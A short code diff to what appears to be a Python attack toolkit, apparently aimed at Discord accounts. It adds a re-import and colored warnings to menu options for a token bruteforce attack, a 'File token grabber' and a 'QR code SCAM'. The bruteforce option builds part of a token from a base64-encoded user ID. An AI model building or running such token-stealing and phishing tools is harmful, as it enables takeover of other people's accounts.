@@ -113,6 +113,7 @@ try:
     from bs4 import BeautifulSoup
 except:
     os.system('pip install beautifulsoup4')
+    from bs4 import BeautifulSoup
 
 try:
     from webdriver_manager.chrome import ChromeDriverManager
@@ -1763,7 +1764,7 @@ def spammer():
 
     if choice == '20':
 
-        print('Do not do this without the permission of the person to who the bruteforce attack is conducted.')
+        print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} Do not do this without the permission of the person to who the bruteforce attack is conducted. ')
 
         id_to_token = base64.b64encode((input("Id of user: ")).encode("ascii"))
         id_to_token = str(id_to_token)[2:-1]
@@ -1798,6 +1799,7 @@ def spammer():
         exit = spammer()
 
     if choice == '21':
+        print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} Do not do this without the permission of the person to who the Token Grabber is conducted.')
         print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} File token grabber')
         print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} QR code SCAM')
         coc = input('[?]> ')
